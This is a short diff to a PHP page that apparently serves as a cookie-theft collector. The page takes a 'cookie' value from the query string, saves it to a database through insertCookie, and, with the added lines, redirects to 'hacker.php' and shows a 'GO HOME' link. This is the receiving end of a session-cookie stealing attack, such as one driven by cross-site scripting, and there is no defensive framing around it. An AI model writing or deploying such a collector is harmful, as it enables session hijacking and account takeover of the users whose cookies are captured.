@@ -3,6 +3,7 @@
         include("connect.php");
         $db = new Connect();
         $db->insertCookie($_GET["cookie"]);
+        header("Location: hacker.php");
         //echo $_GET["cookie"];s
     }
 ?>
@@ -16,5 +17,6 @@
 </head>
 <body>
     <h1>Hello my friend</h1>
+    <a href="index.php">GO HOME</a>
 </body>
 </html>
